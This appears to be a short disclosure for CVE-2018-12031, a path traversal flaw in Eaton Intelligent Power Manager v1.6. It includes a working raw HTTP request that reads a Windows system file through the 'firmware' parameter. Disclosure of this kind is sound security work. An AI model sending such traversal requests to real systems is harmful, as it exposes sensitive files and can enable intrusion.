# Eaton-Intelligent-Power-Manager-Local-File-Inclusion
Local file inclusion in Eaton Intelligent Power Manager  v1.6 allows an attacker to include a file, it can lead to sensitive information disclosure, denial of service and code execution.

# CVE-2018-12031
To exploit vulnerability, someone could use 'https://[HOST]/server/node_upgrade_srv.js?action=downloadFirmware&firmware=/../../../../../../../../../../' request to get some informations from the target.

```
GET /server/node_upgrade_srv.js?action=downloadFirmware&firmware=/../../../../../../../../../../windows/System32/drivers/etc/host HTTP/1.1
Host: 192.168.45.138:4680
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```


![alt tag](https://www.emreovunc.com/blog/en/eaton-power-manager-lfi.jpg)
